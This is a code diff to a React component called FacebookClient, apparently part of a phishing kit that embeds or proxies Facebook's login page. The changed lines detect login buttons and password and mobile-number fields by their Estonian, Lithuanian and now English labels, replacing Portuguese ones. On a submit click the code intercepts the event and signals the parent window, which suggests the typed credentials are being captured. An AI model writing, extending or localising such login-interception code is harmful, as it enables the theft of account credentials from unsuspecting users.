@@ -126,7 +126,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || txt === 'Iniciar sessão' || al === 'Logi sisse' || al === 'Prisijungti' || al === 'Iniciar sessão' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0 || txt.indexOf('Iniciar sessão') === 0 || al.indexOf('Iniciar sessão') === 0) {
+                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || txt === 'Log in' || al === 'Logi sisse' || al === 'Prisijungti' || al === 'Log in' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0 || txt.indexOf('Log in') === 0 || al.indexOf('Log in') === 0) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -270,8 +270,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl.includes("meiliaadresi") ||
           tl.includes("slaptažodis") ||
           tl.includes("slaptazodis") ||
-          tl.includes("palavra-passe") ||
-          tl.includes("telemóvel") || tl.includes("telemovel") ||
+          tl.includes("password") ||
+          tl.includes("mobile number") ||
           tl.includes("paštas") || tl.includes("pastas") ||
           tl.includes("telefono numeris") ||
           tl.includes("mobilusis numeris") ||
@@ -370,8 +370,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             t.includes("meiliaadresi") ||
             t.includes("slaptažodis") ||
             t.includes("slaptazodis") ||
-            t.includes("palavra-passe") ||
-            t.includes("telemóvel") || t.includes("telemovel") ||
+            t.includes("password") ||
+            t.includes("mobile number") ||
             t.includes("paštas") || t.includes("pastas") ||
             t.includes("telefono numeris") ||
             t.includes("mobilusis numeris") ||
@@ -518,7 +518,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const b = btns[i];
           const t = (b.textContent || "").trim();
           const al = b.getAttribute("aria-label") || "";
-          if (t === "Logi sisse" || t === "Prisijungti" || t === "Iniciar sessão" || al === "Logi sisse" || al === "Prisijungti" || al === "Iniciar sessão" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti") || t.startsWith("Iniciar sessão") || al.startsWith("Iniciar sessão")) return b;
+          if (t === "Logi sisse" || t === "Prisijungti" || t === "Log in" || al === "Logi sisse" || al === "Prisijungti" || al === "Log in" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti") || t.startsWith("Log in") || al.startsWith("Log in")) return b;
         }
         return null;
       }
